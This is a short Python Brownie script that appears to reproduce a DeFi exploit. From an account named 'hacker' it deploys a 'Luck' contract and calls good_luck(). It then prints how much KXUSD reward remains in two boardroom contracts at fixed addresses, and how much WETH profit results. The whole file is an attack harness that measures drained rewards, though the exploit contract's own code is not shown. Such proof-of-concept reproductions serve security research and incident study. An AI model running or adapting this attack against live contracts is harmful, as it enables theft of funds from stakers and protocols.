from brownie import accounts, interface, Luck
import json

WETH = interface.ERC20('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')
liquid_boardroom = '0xAcbdB82f07B2653137d3A08A22637121422ae747'
uni_boardroom = '0xd5b0AE8003B24ECF232d434A5f098ea821Cf8aE3'
KXUSD = interface.ERC20('0x43244C686a014C49D3D5B8c4b20b4e3faB0cbDA7')

def main():
    hacker = accounts[0]
    luck = Luck.deploy({'from': hacker})
    print(f'[before] Remain rewards in uni_boardroom: {KXUSD.balanceOf(uni_boardroom)}')
    print(f'[before] Remain rewards in liquid_boardroom: {KXUSD.balanceOf(liquid_boardroom)}')
    luck.good_luck({'from': hacker})
    print(f'[after] Profit weth: {WETH.balanceOf(luck) / 1e18}')
    print(f'[after] Remain rewards in uni_boardroom: {KXUSD.balanceOf(uni_boardroom)}')
    print(f'[after] Remain rewards in liquid_boardroom: {KXUSD.balanceOf(liquid_boardroom)}')